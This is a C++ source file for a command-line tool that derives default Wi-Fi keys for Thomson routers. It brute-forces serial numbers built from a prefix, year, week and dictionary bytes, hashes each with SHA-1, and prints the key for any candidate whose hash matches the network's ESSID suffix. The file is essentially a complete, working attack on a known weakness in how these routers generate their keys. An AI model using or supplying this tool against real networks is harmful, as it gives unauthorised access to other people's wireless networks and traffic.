/*
 * TextMode.cpp
 *
 *  Created on: 2010/06/19
 *      Author: Rui Araújo
 */
#include "TextMode.h"
#include <openssl/sha.h>
#include <omp.h>
#include "unknown.h"
#include <ctime>
#include <stdint.h>
#include <cstdlib>
#include <cstdio>
#include <cctype>
#include <cstring>

#ifdef __unix__
#include <sys/times.h>
#include <unistd.h>
#endif


#define BEGIN_YEAR 4
#define FINAL_YEAR 10



TextMode::TextMode()
{
  // TODO Auto-generated constructor stub

}


int TextMode::exec(int argc, char *argv[])
{
  int n = sizeof(dic)/sizeof("AAA");
   uint32_t essid = 0;
#ifdef __unix__
    struct tms t;
    clock_t start, end;
    long ticks;
    ticks = sysconf(_SC_CLK_TCK);
#endif
   if ( argc > 1 )
     if ( this->validInput( argv[1]) )
       essid = (uint32_t)strtol(argv[1] , NULL , 16);
   if ( essid == 0 )
   {
       printf("Failed in the parsing of the essid code at %s.\n"
               "Launching Graphical Interface..." , argv[1]);
       return 1;
   }
#ifdef __unix__
    start = times(&t);
#endif
   #pragma omp parallel
   {
       uint8_t message_digest[SHA_DIGEST_LENGTH];
       char unknown[7]= "123456";
       char input[13];
       SHA_CTX sha1;
       input[0] = 'C';
       input[1] = 'P';
       uint32_t * ptr = (uint32_t *)malloc(sizeof(uint32_t));
       #pragma omp for
       for( int i = 0 ; i < n; ++i  )
       {
           sprintf( unknown , "%02X%02X%02X" , (int)dic[i][0]
                                   , (int)dic[i][1], (int)dic[i][2] );
           for ( int year = BEGIN_YEAR ; year <= FINAL_YEAR ; ++year )
           {
               for ( int week = 1 ; week <= 52 ; ++week )
               {
                   input[2] = '0' + year/10;
                   input[3] = '0' + year % 10 ;
                   input[4] = '0' + week / 10;
                   input[5] = '0' + week % 10;
                   strcpy( input + 6 , unknown);
                   //printf( "input= %s" , input );
                   SHA1_Init(&sha1);
                   SHA1_Update(&sha1 ,(const void *) input , 12 );
                   SHA1_Final(message_digest , &sha1 );
                   /*
                   * Had to copy the result backwards to match the corret response
                   * No idea why.. But heard about it in some forum...
                   */
                   memcpy(((uint8_t *)ptr) , message_digest + 19 , 1);
                   memcpy(((uint8_t *)ptr) + 1, message_digest + 18 , 1);
                   memcpy(((uint8_t *)ptr) + 2, message_digest + 17 , 1);

                   if ( (*ptr) == essid )
                   {
                       printf( "Possibility: Year - %d\tWeek: %d\n", 2000+year,  week );
                       printf("ESSID: Thomson%02X%02X%02X\t" , message_digest[17] ,
                                        message_digest[18] , message_digest[19]);
                       printf("KEY: %02X%02X%02X%02X%02X\n" , message_digest[0], message_digest[1] ,
                                       message_digest[2] , message_digest[3], message_digest[4] );
                   }


               }
           }
       }
   }
#ifdef __unix__
    end = times(&t);                            /* fim da medição de tempo */
    printf("Clock:           %4.4f s\n", (double)(end-start)/ticks);
    printf("User time:       %4.4f s\n", (double)t.tms_utime/ticks);
    printf("System time:     %4.4f s\n", (double)t.tms_stime/ticks);
#endif
    return 0;
}



bool TextMode::validInput( char * input )
{
  int i = 0;
  if ( input[0] == '0' &&  ( input[1] == 'x' ||input[1] == 'X')  )
    input += 2;
  int n = strlen( input );
  if ( n > 6 )
    return false;

  for ( ;  i < n ; ++i)
    if ( !isxdigit( input[i] ) )
      return 0;
  return true;
}
